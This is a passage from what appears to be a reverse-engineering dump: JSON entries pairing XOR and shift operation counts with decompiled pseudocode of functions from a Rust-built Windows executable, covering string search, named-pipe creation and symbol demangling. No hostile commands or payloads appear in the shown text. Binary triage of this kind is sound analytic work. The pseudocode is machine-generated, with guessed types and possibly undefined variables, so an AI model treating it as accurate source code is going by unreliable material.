v6 - v85;\n              goto LABEL_14;\n            }\n          }\n          v14 = v85;\n          do\n          {\n            if ( v5 >= v14 )\n              goto LABEL_53;\n            if ( --v14 >= v94 )\n              goto LABEL_51;\n            v15 = v14 + v6;\n            if ( v14 + v6 >= v92 )\n              goto LABEL_47;\n          }\n          while ( *(_BYTE *)(v93 + v14) == *(_BYTE *)(v91 + v15) );\n          v6 += v87;\n          v5 = v94 - v87;\n        }\n        else\n        {\n          v6 += v94;\nLABEL_14:\n          v5 = 0i64;\n        }\n        v7 = v6 + v8;\n      }\n      while ( v6 + v8 < v92 );\n    }\n    goto LABEL_43;\n  }\n  v6 = v89;\n  v16 = v89 + v94 - 1;\n  if ( v16 >= v92 )\n  {\nLABEL_43:\n    v4 = v95;\n    goto LABEL_81;\n  }\n  v17 = v94 - 1;\n  v18 = v88;\n  v97 = v87;\n  while ( 1 )\n  {\n    if ( !_bittest64(&v18, *(unsigned __int8 *)(v91 + v16)) )\n    {\n      v19 = v94 + v6;\n      goto LABEL_29;\n    }\n    v21 = 0i64;\n    v22 = v6;\n    v23 = (char *)(v85 + v93);\n    while ( v85 + v21 < v94 )\n    {\n      if ( v85 + v22 >= v92 )\n      {\n        v30 = v85 + v6;\n        if ( v92 > v30 )\n          v30 = v92;\n        sub_14005CD40(v30, v92, (__int64)&off_140068D10);\n      }\n      v24 = *v23++;\n      v20 = v22 + 1;\n      ++v21;\n      v13 = v24 == *(_BYTE *)(v91 + v85 + v22++);\n      if ( !v13 )\n        goto LABEL_30;\n    }\n    if ( v85 - 1 >= v94 )\n      break;\n    v15 = v85 - 1 + v6;\n    v25 = (char *)(v93 + v85 - 1);\n    v26 = v85;\n    do\n    {\n      v27 = v26-- == 0;\n      if ( v27 )\n        goto LABEL_53;\n      if ( v15 >= v92 )\nLABEL_47:\n        sub_14005CD40(v15, v92, (__int64)&off_140068D40);\n      v28 = *v25--;\n      v13 = v28 == *(_BYTE *)(v91 + v15--);\n    }\n    while ( v13 );\n    v19 = v97 + v6;\nLABEL_29:\n    v20 = v19;\nLABEL_30:\n    v16 = v20 + v17;\n    v6 = v20;\n    if ( v20 + v17 >= v92 )\n      goto LABEL_43;\n  }\n  if ( v85 )\n  {\n    v14 = v85 - 1;\nLABEL_51:\n    sub_14005CD40(v14, v94, (__int64)&off_140068D28);\n  }\nLABEL_53:\n  v4 = v95;\nLABEL_54:\n  v31 = v3;\n  v32 = v6 + 6;\n  if ( v6 != -6i64 )\n  {\n    if ( v32 < v3 )\n    {\n      if ( v4[v32] > -65 )\n      {\n        v31 = v3 - v32;\n        goto LABEL_59;\n      }\nLABEL_197:\n      sub_14005D310(v4, v3, v32, v3, (__int64)&off_140067978);\n    }\n    v31 = v3 - v32;\n    if ( v3 != v32 )\n      goto LABEL_197;\n  }\nLABEL_59:\n  if ( v31 )\n  {\n    v33 = &v4[v32];\n    v34 = (unsigned __int8 *)&v33[v31];\n    do\n    {\n      v35 = (unsigned __int8)*v33;\n      if ( *v33 < 0 )\n      {\n        v36 = v35 & 0x1F;\n        v37 = v33[1] & 0x3F;\n        if ( (unsigned __int8)v35 <= 0xDFu )\n        {\n          v33 += 2;\n          v35 = v37 | (v36 << 6);\n        }\n        else\n        {\n          v38 = (v37 << 6) | v33[2] & 0x3F;\n          if ( (unsigned __int8)*v33 < 0xF0u )\n          {\n            v33 += 3;\n            v35 = (v36 << 12) | v38;\n          }\n          else\n          {\n            v35 = ((v35 & 7) << 18) | (v38 << 6) | v33[3] & 0x3F;\n            if ( v35 == 1114112 )\n              break;\n            v33 += 4;\n          }\n        }\n      }\n      else\n      {\n        ++v33;\n      }\n      if ( v35 - 65 >= 6 && (v35 < 0x30 || v35 >= 0x3A && v35 != 64) )\n        goto LABEL_81;\n    }\n    while ( v33 != (char *)v34 );\n  }\n  if ( v6 )\n  {\n    if ( v6 >= v3 )\n    {\n      if ( v6 == v3 )\n        goto LABEL_81;\n    }\n    else if ( v4[v6] > -65 )\n    {\n      v3 = v6;\n      goto LABEL_81;\n    }\n    sub_14005D310(v4, v3, 0i64, v6, (__int64)&off_140067990);\n  }\n  v39 = 2i64;\nLABEL_196:\n  result = v96;\n  *v96 = v39;\n  return result;\n}\n// 14005D130: using guessed type void __fastcall __noreturn sub_14005D130(_DWORD, _DWORD, _DWORD, _DWORD, __int64);\n// 140067268: using guessed type __int64 (__fastcall *off_140067268)();\n// 140067358: using guessed type char *off_140067358;\n// 140067370: using guessed type char *off_140067370;\n// 140067388: using guessed type char *off_140067388;\n// 1400675A0: using guessed type char *off_1400675A0;\n// 1400675B8: using guessed type char *off_1400675B8;\n// 1400675D0: using guessed type char *off_1400675D0;\n// 1400675E8: using guessed type char *off_1400675E8;\n// 140067640: using guessed type char *off_140067640;\n// 140067908: using guessed type _BYTE byte_140067908[6];\n// 140067978: using guessed type void *off_140067978;\n// 140067990: using guessed type void *off_140067990;\n// 140068D10: using guessed type void *off_140068D10;\n// 140068D28: using guessed type void *off_140068D28;\n// 140068D40: using guessed type void *off_140068D40;\n\n"
    },
    {
        "Function": "sub_140042C60",
        "Total XOR and shift operations": 17,
        "XOR operations": 1,
        "Shift operations": 16,
        "Operation percentage": "4.24%",
        "Function Body": "\nint __fastcall sub_140042C60(__int64 a1, unsigned __int8 a2)\n{\n  char v2; // di\n  DWORD v3; // r14d\n  char v4; // si\n  NTSTATUS (__stdcall *v5)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG); // rbx\n  __int64 v6; // rax\n  unsigned int v7; // edi\n  char *v8; // r15\n  __int16 v9; // r12\n  __int16 v10; // r14\n  unsigned __int64 v11; // rbx\n  int v12; // eax\n  int v13; // edx\n  int v14; // edi\n  __int64 v15; // rax\n  unsigned __int64 v16; // rbx\n  unsigned __int64 v17; // rbx\n  char *v18; // rax\n  __int64 v19; // rsi\n  unsigned __int64 v20; // rdi\n  __int16 v21; // cx\n  unsigned int v22; // r13d\n  unsigned __int64 v23; // rdx\n  __int64 v24; // rdx\n  __int64 v25; // rdx\n  bool v26; // cf\n  unsigned __int64 v27; // rdx\n  __int64 v28; // rax\n  int v29; // ecx\n  int v30; // r8d\n  int v31; // r13d\n  unsigned __int8 v32; // dl\n  void *v33; // rbx\n  HANDLE NamedPipeW; // rsi\n  __int64 v35; // rax\n  __int64 v36; // rcx\n  _QWORD *v37; // rax\n  __int64 v38; // rdi\n  void *v39; // rdi\n  __int64 v40; // rdx\n  int v42; // [rsp+48h] [rbp-38h]\n  LPCWSTR lpName[2]; // [rsp+50h] [rbp-30h] BYREF\n  __int64 v44; // [rsp+60h] [rbp-20h]\n  DWORD *p_CurrentProcessId; // [rsp+70h] [rbp-10h] BYREF\n  __int64 (__fastcall *v46)(unsigned int *, __int64); // [rsp+78h] [rbp-8h]\n  LPCWSTR *v47; // [rsp+80h] [rbp+0h]\n  __int64 (__fastcall *v48)(unsigned __int64 *, __int64); // [rsp+88h] [rbp+8h]\n  __int128 v49; // [rsp+90h] [rbp+10h]\n  __int64 v50; // [rsp+A0h] [rbp+20h]\n  DWORD CurrentProcessId; // [rsp+B4h] [rbp+34h] BYREF\n  int v52; // [rsp+B8h] [rbp+38h]\n  DWORD dwOpenMode; // [rsp+BCh] [rbp+3Ch]\n  DWORD dwPipeMode[2]; // [rsp+C0h] [rbp+40h]\n  _QWORD *v55; // [rsp+C8h] [rbp+48h]\n  UCHAR pbBuffer[16]; // [rsp+D0h] [rbp+50h] BYREF\n  __int128 v57; // [rsp+E0h] [rbp+60h]\n  __int64 v58; // [rsp+F0h] [rbp+70h]\n  __int128 v59; // [rsp+100h] [rbp+80h] BYREF\n  __int64 v60; // [rsp+110h] [rbp+90h]\n  unsigned __int8 *v61; // [rsp+118h] [rbp+98h]\n  unsigned __int8 v62; // [rsp+125h] [rbp+A5h]\n  char v63; // [rsp+126h] [rbp+A6h]\n  char v64; // [rsp+127h] [rbp+A7h]\n  __int64 v65; // [rsp+128h] [rbp+A8h]\n\n  v65 = -2i64;\n  v55 = (_QWORD *)a1;\n  v62 = a2;\n  dwOpenMode = 1074266114 - a2;\n  v2 = 0;\n  v3 = 8;\n  v4 = 1;\n  v5 = BCryptGenRandom;\n  v42 = 0;\n  while ( 2 )\n  {\n    CurrentProcessId = GetCurrentProcessId();\n    while ( !qword_140084BD0 )\n    {\n      *(_OWORD *)pbBuffer = 0i64;\n      if ( v5(0i64, pbBuffer, 0x10u, 2u) >= 0 )\n      {\n        v6 = *(_QWORD *)pbBuffer;\n      }\n      else\n      {\n        v64 = v2;\n        v63 = 1;\n        v6 = sub_1400446D0();\n      }\n      _InterlockedExchange64(&qword_140084BD0, v6);\n    }\n    lpName[0] = (LPCWSTR)_InterlockedExchangeAdd64(&qword_140084BD0, 1ui64);\n    p_CurrentProcessId = &CurrentProcessId;\n    v46 = sub_140008C20;\n    v47 = lpName;\n    v48 = sub_140007380;\n    *(_QWORD *)pbBuffer = &off_14006B530;\n    *(_QWORD *)&pbBuffer[8] = 2i64;\n    v58 = 0i64;\n    *(_QWORD *)&v57 = &p_CurrentProcessId;\n    *((_QWORD *)&v57 + 1) = 2i64;\n    v64 = v2;\n    v63 = 1;\n    sub_140006C00((__int64 *)&v59, (__int64 *)pbBuffer);\n    *(_OWORD *)pbBuffer = v59;\n    *(_QWORD *)&v57 = v60;\n    if ( !((*((_QWORD *)&v49 + 1) == 0i64) | v4 & 1) )\n      sub_140006340((void *)v49, 1ui64);\n    v50 = v57;\n    v49 = *(_OWORD *)pbBuffer;\n    v61 = (unsigned __int8 *)(*(_QWORD *)pbBuffer + v57);\n    dwPipeMode[0] = v3;\n    if ( (_QWORD)v57 )\n    {\n      LOWORD(v7) = (unsigned __int8)**(_BYTE **)pbBuffer;\n      if ( (char)**(_BYTE **)pbBuffer >= 0 )\n      {\n        v8 = (char *)(*(_QWORD *)pbBuffer + 1i64);\nLABEL_20:\n        v15 = 1i64;\n        v9 = 0;\nLABEL_21:\n        v16 = v61 - (unsigned __int8 *)v8 + 3;\n        if ( (unsigned __int64)(v61 - (unsigned __int8 *)v8) >= 0xFFFFFFFFFFFFFFFDui64 )\n          v16 = -1i64;\n        v11 = v15 + (v16 >> 2);\n        v10 = 1;\n        goto LABEL_24;\n      }\n      v12 = v7 & 0x1F;\n      v13 = *(_BYTE *)(*(_QWORD *)pbBuffer + 1i64) & 0x3F;\n      if ( (unsigned __int8)v7 <= 0xDFu )\n      {\n        v8 = (char *)(*(_QWORD *)pbBuffer + 2i64);\n        LOWORD(v7) = v13 | ((_WORD)v12 << 6);\n        goto LABEL_20;\n      }\n      v14 = (v13 << 6) | *(_BYTE *)(*(_QWORD *)pbBuffer + 2i64) & 0x3F;\n      if ( **(_BYTE **)pbBuffer < 0xF0u )\n      {\n        v8 = (char *)(*(_QWORD *)pbBuffer + 3i64);\n        v7 = (v12 << 12) | v14;\n        if ( v7 <= 0xFFFF )\n          goto LABEL_20;\n      }\n      else\n      {\n        v8 = (char *)(*(_QWORD *)pbBuffer + 4i64);\n        v7 = ((v12 & 7) << 18) | (v14 << 6) | *(_BYTE *)(*(_QWORD *)pbBuffer + 3i64) & 0x3F;\n        if ( v7 <= 0xFFFF )\n          goto LABEL_20;\n      }\n      v9 = v7 & 0x3FF | 0xDC00;\n      v15 = 2i64;\n      LOWORD(v7) = ((v7 + 16711680) >> 10) | 0xD800;\n      goto LABEL_21;\n    }\n    LOWORD(v7) = 0;\n    v8 = 0i64;\n    v9 = 0;\n    v10 = 0;\n    v11 = 0i64;\nLABEL_24:\n    if ( v11 < 4 )\n      v11 = 3i64;\n    if ( v11 >= 0x3FFFFFFFFFFFFFFFi64 )\n    {\n      v64 = 1;\n      v63 = 1;\n      sub_140006390();\n    }\n    v17 = v11 + 1;\n    v18 = sub_1400062B0(2 * v17, 2ui64);\n    if ( !v18 )\n    {\n      v64 = 1;\n      v63 = 1;\n      sub_14005CBB0(2i64, 2 * v17);\n    }\n    v52 = v42 + 1;\n    *(_WORD *)v18 = v7;\n    *(_QWORD *)&v59 = v18;\n    *((_QWORD *)&v59 + 1) = v17;\n    v60 = 1i64;\n    v19 = 1i64;\n    v20 = v17;\n    while ( v8 )\n    {\n      if ( v9 )\n      {\n        v21 = 0;\n        LOWORD(v22) = v9;\n      }\n      else\n      {\n        if ( v8 == (char *)v61 )\n          break;\n        LOWORD(v22) = (unsigned __int8)*v8;\n        if ( *v8 < 0 )\n        {\n          v29 = v22 & 0x1F;\n          v30 = v8[1] & 0x3F;\n          if ( (unsigned __int8)v22 <= 0xDFu )\n          {\n            v8 += 2;\n            LOWORD(v22) = v30 | ((_WORD)v29 << 6);\n            v21 = 0;\n          }\n          else\n          {\n            v31 = (v30 << 6) | v8[2] & 0x3F;\n            if ( (unsigned __int8)*v8 < 0xF0u )\n            {\n              v8 += 3;\n              v22 = (v29 << 12) | v31;\n              if ( v22 <= 0xFFFF )\n              {\nLABEL_61:\n                v21 = 0;\n                goto LABEL_34;\n              }\n            }\n            else\n            {\n              v32 = v8[3];\n              v8 += 4;\n              v22 = ((v29 & 7) << 18) | (v31 << 6) | v32 & 0x3F;\n              if ( v22 <= 0xFFFF )\n                goto LABEL_61;\n            }\n            v21 = v22 & 0x3FF | 0xDC00;\n            LOWORD(v22) = ((v22 + 16711680) >> 10) | 0xD800;\n          }\n        }\n        else\n        {\n          ++v8;\n          v21 = 0;\n        }\n      }\nLABEL_34:\n      if ( v19 != v20 )\n      {\n        v9 = v21;\n        goto LABEL_30;\n      }\n      v23 = v61 - (unsigned __int8 *)v8 + 3;\n      if ( (unsigned __int64)(v61 - (unsigned __int8 *)v8) >= 0xFFFFFFFFFFFFFFFDui64 )\n        v23 = -1i64;\n      v24 = (v23 >> 2) - ((v21 == 0) - 1i64) - ((v10 == 0) - 1i64);\n      v9 = v21;\nLABEL_43:\n      v25 = v24 + 1;\n      v26 = __CFADD__(v19, v25);\n      v27 = v19 + v25;\n      if ( v26 )\n        goto LABEL_87;\n      v20 = *((_QWORD *)&v59 + 1);\n      v17 = 2i64 * *((_QWORD *)&v59 + 1);\n      if ( 2i64 * *((_QWORD *)&v59 + 1) <= v27 )\n        v17 = v27;\n      if ( v17 < 5 )\n        v17 = 4i64;\n      if ( *((_QWORD *)&v59 + 1) )\n      {\n        *(_QWORD *)pbBuffer = v59;\n        *(_QWORD *)&v57 = 2i64 * *((_QWORD *)&v59 + 1);\n        v28 = 2i64;\n      }\n      else\n      {\n        v28 = 0i64;\n      }\n      *(_QWORD *)&pbBuffer[8] = v28;\n      sub_14002C100((__int64 *)&p_CurrentProcessId, 2i64 * (v17 >> 62 == 0), 2 * v17, (__int64)pbBuffer);\n      v18 = (char *)v46;\n      if ( p_CurrentProcessId )\n      {\n        if ( v46 != (__int64 (__fastcall *)(unsigned int *, __int64))0x8000000000000001i64 )\n        {\n          if ( v46 )\n          {\n            v60 = v19;\n            sub_14005CBB0((__int64)v46, (__int64)v47);\n          }\nLABEL_87:\n          v60 = v19;\n          sub_140006390();\n        }\n        v18 = (char *)v59;\n        v17 = v20;\n      }\n      else\n      {\n        *(_QWORD *)&v59 = v46;\n        *((_QWORD *)&v59 + 1) = v17;\n        v20 = v17;\n      }\nLABEL_30:\n      *(_WORD *)&v18[2 * v19++] = v22;\n    }\n    if ( v10 == 1 )\n    {\n      LOWORD(v22) = 0;\n      v20 = v17;\n      v8 = 0i64;\n      v10 = 0;\n      v24 = 0i64;\n      if ( v19 != v17 )\n        goto LABEL_30;\n      goto LABEL_43;\n    }\n    *(_OWORD *)lpName = v59;\n    v44 = v19;\n    v33 = (void *)v59;\n    v3 = dwPipeMode[0];\n    NamedPipeW = CreateNamedPipeW((LPCWSTR)v59, dwOpenMode, dwPipeMode[0], 1u, 0x10000u, 0x10000u, 0, 0i64);\n    if ( NamedPipeW == (HANDLE)-1i64 )\n    {\n      LODWORD(v35) = GetLastError();\n      v36 = (v35 << 32) | 2;\n      *(_QWORD *)pbBuffer = v36;\n      if ( v52 < 10 )\n      {\n        if ( (_DWORD)v35 == 5 )\n        {\n          v42 = v52;\nLABEL_68:\n          sub_14002B4A0((__int64 *)pbBuffer);\n          if ( lpName[1] )\n            sub_140006340(v33, 2ui64);\n          v2 = 1;\n          v4 = 0;\n          v5 = BCryptGenRandom;\n          continue;\n        }\n        if ( v3 )\n        {\n          v3 = 0;\n          if ( (_DWORD)v35 == 87 )\n            goto LABEL_68;\n        }\n      }\n      v37 = v55;\n      v55[1] = v36;\n      *v37 = 1i64;\n      if ( lpName[1] )\n        LODWORD(v37) = sub_140006340(v33, 2ui64);\n      v38 = -1i64;\n      if ( *((_QWORD *)&v49 + 1) )\nLABEL_75:\n        LODWORD(v37) = sub_140006340((void *)v49, 1ui64);\nLABEL_76:\n      if ( NamedPipeW != (HANDLE)-1i64 )\n        LODWORD(v37) = CloseHandle((HANDLE)v38);\n    }\n    else\n    {\n      if ( lpName[1] )\n        sub_140006340(v33, 2ui64);\n      *(_DWORD *)pbBuffer = 0;\n      *(_DWORD *)((char *)&v58 + 2) = 0;\n      BYTE1(v58) = v62;\n      LOBYTE(v58) = v62 ^ 1;\n      v57 = 0i64;\n      LODWORD(p_CurrentProcessId) = 24;\n      v46 = 0i64;\n      LODWORD(v47) = 1;\n      *(_QWORD *)&pbBuffer[8] = &p_CurrentProcessId;\n      v39 = (void *)v49;\n      v64 = 1;\n      v63 = 0;\n      if ( sub_140034740((char *)v49, v50, (__int64)pbBuffer) )\n      {\n        v37 = v55;\n        v55[1] = v40;\n        *v37 = 1i64;\n        v38 = (__int64)NamedPipeW;\n        if ( *((_QWORD *)&v49 + 1) )\n          goto LABEL_75;\n        goto LABEL_76;\n      }\n      v37 = v55;\n      v55[1] = NamedPipeW;\n      v37[2] = v40;\n      *v37 = 0i64;\n      if ( *((_QWORD *)&v49 + 1) )\n        LODWORD(v37) = sub_140006340(v39, 1ui64);\n    }\n    return (int)v37;\n  }\n}\n// 1400431D2: variable 'v35' is possibly undefined\n// 140043366: variable 'v40' is possibly undefined\n// 14006B530: using guessed type char *off_14006B530;\n// 140084BD0: using guessed type __int64 qword_140084BD0;\n\n"
    },
    {
        "Function": "sub_140020590",
        "Total XOR and shift operations": 27,
        "XOR operations": 1,
        "Shift operations": 26,
        "Operation percentage": "3.71%",
        "Function Body": "\nchar __fastcall sub_140020590(char ***a1, __int64 *a2)\n{\n  __int64 *v2; // rbx\n  char **v3; // rax\n  char *v4; // rdi\n  unsigned __int64 v5; // r14\n  __int64 v6; // rbp\n  __int64 v7; // rsi\n  char v8; // al\n  char *v9; // r12\n  int v10; // eax\n  unsigned __int64 v11; // r13\n  unsigned __int64 v12; // rdi\n  int v13; // ecx\n  int v14; // r8d\n  int v15; // r9d\n  char *v16; // r11\n  unsigned __int64 v17; // r15\n  unsigned __int64 v18; // r14\n  int v19; // edx\n  char *v20; // rax\n  int v21; // r8d\n  int v22; // r10d\n  int v23; // r9d\n  int v24; // edx\n  bool v25; // cf\n  unsigned int v26; // edx\n  char v27; // al\n  __int64 v28; // rbp\n  __int64 v29; // rsi\n  char *v30; // r12\n  unsigned __int64 v31; // r13\n  int v32; // eax\n  char *v33; // r10\n  char v34; // cl\n  int v35; // eax\n  int v36; // eax\n  int v37; // r8d\n  int v38; // edx\n  char *v39; // rax\n  unsigned __int64 v40; // r8\n  char *v41; // rcx\n  char *v42; // r9\n  unsigned __int64 v43; // r14\n  int v44; // edx\n  int v45; // r8d\n  int v46; // r11d\n  int v47; // r10d\n  __int64 v48; // rax\n  char v49; // al\n  char *v50; // r14\n  unsigned __int64 v51; // rdx\n  unsigned __int64 v52; // r9\n  unsigned __int64 v53; // r8\n  unsigned __int64 v54; // rbx\n  __int64 v55; // rbx\n  char *v56; // rdx\n  int v57; // eax\n  char v58; // al\n  unsigned __int8 (__fastcall *v59)(__int64, unsigned __int16 *, __int64); // r9\n  char *v60; // rbx\n  unsigned __int64 v61; // rdx\n  unsigned __int8 *v62; // rbx\n  char *v63; // r8\n  int v64; // r9d\n  int v65; // r10d\n  int v66; // eax\n  int v67; // r11d\n  char v68; // cl\n  int v69; // eax\n  __int64 v70; // r9\n  unsigned int v71; // r8d\n  int v72; // eax\n  unsigned int v73; // r10d\n  int v74; // eax\n  unsigned int v75; // eax\n  char v76; // al\n  int v77; // eax\n  unsigned int v78; // r10d\n  int v79; // eax\n  unsigned int v80; // eax\n  char **v82; // rax\n  char *v83; // r12\n  char **v84; // rax\n  unsigned __int64 v85; // [rsp+30h] [rbp-B8h]\n  unsigned int v86; // [rsp+3Ch] [rbp-ACh] BYREF\n  __int64 *v87; // [rsp+40h] [rbp-A8h]\n  __int64 v88; // [rsp+48h] [rbp-A0h]\n  __int128 v89; // [rsp+50h] [rbp-98h] BYREF\n  __int64 v90; // [rsp+60h] [rbp-88h]\n  __int64 v91; // [rsp+68h] [rbp-80h]\n  __int64 v92; // [rsp+70h] [rbp-78h]\n  __int64 v93; // [rsp+78h] [rbp-70h]\n  char *v94; // [rsp+80h] [rbp-68h]\n  __int64 v95; // [rsp+88h] [rbp-60h]\n  __int64 v96; // [rsp+90h] [rbp-58h] BYREF\n  unsigned __int64 v97; // [rsp+98h] [rbp-50h]\n\n  v2 = a2;\n  v3 = *a1;\n  v4 = **a1;\n  if ( !v4 )\n  {\n    v89 = *(_OWORD *)(v3 + 1);\n    v90 = 0i64;\n    LODWORD(v91) = 0;\n    v92 = (__int64)a2;\n    LODWORD(v93) = 0;\n    LOBYTE(a2) = 1;\n    return sub_14001A8E0((__int64)&v89, (unsigned int)a2);\n  }\n  v5 = (unsigned __int64)v3[1];\n  v6 = (__int64)v3[2];\n  v7 = 0i64;\n  v95 = v6;\n  v87 = a2;\nLABEL_4:\n  if ( v7 == v6 )\n    return 0;\n  if ( !v5 )\n    goto LABEL_186;\n  v9 = v4;\n  LOBYTE(v10) = *v4;\n  v11 = 0i64;\n  v12 = v5;\n  if ( (v10 & 0x80u) != 0 )\n  {\nLABEL_11:\n    v13 = v10 & 0x1F;\n    v14 = v9[v11 + 1] & 0x3F;\n    if ( (unsigned __int8)v10 <= 0xDFu )\n    {\n      v10 = v14 | (v13 << 6);\n      goto LABEL_18;\n    }\n    v15 = (v14 << 6) | v9[v11 + 2] & 0x3F;\n    if ( (unsigned __int8)v10 < 0xF0u )\n    {\n      v10 = (v13 << 12) | v15;\n      goto LABEL_18;\n    }\n    v10 = ((v10 & 7) << 18) | (v15 << 6) | v9[v11 + 3] & 0x3F;\n    if ( v10 != 1114112 )\n      goto LABEL_18;\nLABEL_186:\n    sub_14005CEC0(\n      (__int64)\"called `Option::unwrap()` on a `None` valueC:\\\\Users\\\\root\\\\.cargo\\\\registry\\\\src\\\\index.crates.io-6f17d2\"\n               \"2bba15001f\\\\winapi-util-0.1.5\\\\src\\\\win.rs\",\n      43i64,\n      (__int64)&off_140067518);\n  }\n  while ( 1 )\n  {\n    v10 = (unsigned __int8)v10;\nLABEL_18:\n    if ( (unsigned int)(v10 - 48) >= 0xA )\n      break;\n    if ( v12 < 2 )\n      goto LABEL_186;\n    LOBYTE(v10) = v9[v11 + 1];\n    if ( (char)v10 <= -65 )\n      sub_14005D310(&v9[v11], v12, 1ui64, v12, (__int64)&off_1400673B8);\n    --v12;\n    ++v11;\n    if ( (v10 & 0x80u) != 0 )\n      goto LABEL_11;\n  }\n  if ( v11 && (v5 < v12 || v9[v11] <= -65) )\n    sub_14005D310(v9, v5, 0i64, v11, (__int64)&off_140067500);\n  v88 = v7 + 1;\n  sub_14000CED0((__int64)&v89, (unsigned __int8 *)v9, v11);\n  if ( (_BYTE)v89 )\n  {\n    LOBYTE(v96) = BYTE1(v89);\n    sub_14005D130(\n      (unsigned int)\"called `Result::unwrap()` on an `Err` value\",\n      43,\n      (unsigned int)&v96,\n      (unsigned int)&off_1400672C8,\n      (__int64)&off_1400673D0);\n  }\n  v16 = &v9[v11];\n  v17 = *((_QWORD *)&v89 + 1);\n  if ( !*((_QWORD *)&v89 + 1) )\n  {\n    v85 = v12;\n    v4 = &v9[v11];\n    goto LABEL_50;\n  }\n  v18 = v5 - *((_QWORD *)&v89 + 1);\n  if ( v12 <= *((_QWORD *)&v89 + 1) )\n  {\n    if ( v18 != v11 )\nLABEL_194:\n      sub_14005D310(&v9[v11], v12, *((unsigned __int64 *)&v89 + 1), v12, (__int64)&off_1400673E8);\n    v4 = &v16[v12];\n    v85 = 0i64;\n    if ( (*((_BYTE *)v2 + 52) & 4) == 0 )\n      goto LABEL_50;\n  }\n  else\n  {\n    if ( v9[*((_QWORD *)&v89 + 1) + v11] <= -65 )\n      goto LABEL_194;\n    v85 = v18 - v11;\n    v4 = &v9[*((_QWORD *)&v89 + 1) + v11];\n    if ( (*((_BYTE *)v2 + 52) & 4) == 0 )\n      goto LABEL_50;\n  }\n  if ( v88 == v6 && *v16 == 104 )\n  {\n    if ( *((_QWORD *)&v89 + 1) < 2ui64 )\n      return 0;\n    LOBYTE(v19) = v9[v11 + 1];\n    if ( (char)v19 <= -65 )\n    {\n      v83 = &v9[v11];\n      v84 = &off_1400673A0;\nLABEL_200:\n      sub_14005D310(v83, v17, 1ui64, v17, (__int64)v84);\n    }\n    v20 = &v9[v11 + 1];\n    if ( (v19 & 0x80u) != 0 )\n    {\nLABEL_36:\n      v21 = v19 & 0x1F;\n      v22 = v20[1] & 0x3F;\n      if ( (unsigned __int8)v19 <= 0xDFu )\n      {\n        v20 += 2;\n        v19 = v22 | (v21 << 6);\n        goto LABEL_43;\n      }\n      v23 = (v22 << 6) | v20[2] & 0x3F;\n      if ( (unsigned __int8)v19 < 0xF0u )\n      {\n        v20 += 3;\n        v19 = (v21 << 12) | v23;\n        goto LABEL_43;\n      }\n      v19 = ((v19 & 7) << 18) | (v23 << 6) | v20[3] & 0x3F;\n      if ( v19 != 1114112 )\n      {\n        v20 += 4;\n        goto LABEL_43;\n      }\n      return 0;\n    }\n    while ( 1 )\n    {\n      ++v20;\n      v19 = (unsigned __int8)v19;\nLABEL_43:\n      if ( (unsigned int)(v19 - 48) >= 0xA )\n      {\n        v24 = (v19 | 0x20) - 97;\n        v25 = __CFADD__(v24, 10);\n        v26 = v24 + 10;\n        if ( v25 )\n          v26 = -1;\n        if ( v26 > 0xF )\n          break;\n      }\n      if ( &v9[*((_QWORD *)&v89 + 1) + v11] == v20 )\n        return 0;\n      LOBYTE(v19) = *v20;\n      if ( *v20 < 0 )\n        goto LABEL_36;\n    }\n  }\nLABEL_50:\n  if ( v7 )\n  {\n    v27 = (*(__int64 (__fastcall **)(__int64, unsigned __int16 *, __int64))(v2[5] + 24))(v2[4], word_140067400, 2i64);\n    v16 = &v9[v11];\n    if ( v27 )\n      return 1;\n  }\n  if ( v17 >= 2 && *(_WORD *)v16 == 9311 )\n  {\n    if ( v9[v11 + 1] <= -65 )\n    {\n      v83 = &v9[v11];\n      v84 = &off_140067408;\n      goto LABEL_200;\n    }\n    v16 = &v9[v11 + 1];\n    --v17;\n  }\n  v28 = v2[4];\n  v29 = v2[5];\n  while ( 2 )\n  {\n    while ( 1 )\n    {\n      v30 = v16;\n      v31 = v17;\n      if ( !v17 )\n        break;\n      v32 = (unsigned __int8)*v16;\n      if ( v32 == 36 )\n      {\n        if ( v17 < 2 )\n        {\n          v48 = 0i64;\n        }\n        else\n        {\n          if ( v16[1] <= -65 )\n          {\n            v82 = &off_140067468;\nLABEL_197:\n            sub_14005D310(v30, v31, 1ui64, v31, (__int64)v82);\n          }\n          v48 = v17 - 1;\n        }\n        v50 = v16 + 1;\n        *(_QWORD *)&v89 = v16 + 1;\n        *((_QWORD *)&v89 + 1) = v48;\n        v90 = 0i64;\n        v91 = v48;\n        v92 = 1i64;\n        v93 = 0x2400000024i64;\n        sub_14001A6D0(&v96, (__int64 *)&v89);\n        if ( !v96 )\n          goto LABEL_3;\n        v51 = v97;\n        if ( v97 == -1i64 )\n          sub_14005D3B0();\n        v52 = v97 + 1;\n        if ( v17 >= 2 && *v50 < -64 )\nLABEL_189:\n          sub_14005D310(v30, v17, 1ui64, v52, (__int64)&off_140067480);\n        if ( v52 < v17 )\n        {\n          if ( v30[v52] < -64 )\n            goto LABEL_189;\n          v53 = v97 + 2;\n          goto LABEL_105;\n        }\n        if ( v52 != v17 )\n          goto LABEL_189;\n        v53 = v97 + 2;\n        if ( v97 == -2i64 )\n        {\n          v51 = -2i64;\n          v55 = (__int64)v30;\n          if ( *v50 != 117 )\n            goto LABEL_3;\n          goto LABEL_140;\n        }\nLABEL_105:\n        v17 -= v53;\n        if ( v31 <= v53 )\n        {\n          v54 = v31;\n          if ( v31 != v53 )\nLABEL_193:\n            sub_14005D310(v30, v31, v53, v31, (__int64)&off_140067498);\n        }\n        else\n        {\n          if ( v30[v53] <= -65 )\n            goto LABEL_193;\n          v54 = v53;\n        }\n        v55 = (__int64)&v30[v54];\n        if ( v97 == 1 )\n        {\n          v57 = (unsigned __int8)*v50;\n          v56 = \",\";\n          if ( v57 != 67 )\n          {\n            if ( v57 != 117 )\n              goto LABEL_3;\n            v61 = 0i64;\n            goto LABEL_142;\n          }\nLABEL_120:\n          v58 = (*(__int64 (__fastcall **)(__int64, char *, __int64))(v29 + 24))(v28, v56, 1i64);\n          v16 = (char *)v55;\n          if ( v58 )\n            return 1;\n          continue;\n        }\n        if ( v97 != 2 )\n        {\n          if ( !v97 )\n            goto LABEL_3;\n          goto LABEL_135;\n        }\n        v56 = (char *)&unk_1400674B0;\n        if ( *(_WORD *)v50 == 20563 )\n          goto LABEL_120;\n        v56 = \"*fatal runtime error: I/O error: operation failed to complete synchronously\\n\";\n        if ( *(_WORD *)v50 == 20546 )\n          goto LABEL_120;\n        v56 = (char *)&unk_1400674B1;\n        if ( *(_WORD *)v50 == 18002 )\n          goto LABEL_120;\n        v56 = 